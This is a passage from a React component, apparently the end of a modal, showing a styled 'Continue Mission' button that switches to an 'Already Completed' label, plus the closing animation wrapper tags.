                      className="w-full flex items-center justify-center gap-2 px-6 py-3 bg-gradient-to-r from-green-500 to-cyan-500 hover:from-green-600 hover:to-cyan-600 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed text-white rounded-lg font-medium transition-all shadow-lg shadow-green-500/25"
                    >
                      <CheckCircle className="w-5 h-5" />
                      <span>
                        {isAlreadyCompleted
                          ? '✓ Already Completed'
                          : 'Continue Mission'}
                      </span>
                    </button>
                  </motion.div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  )
}
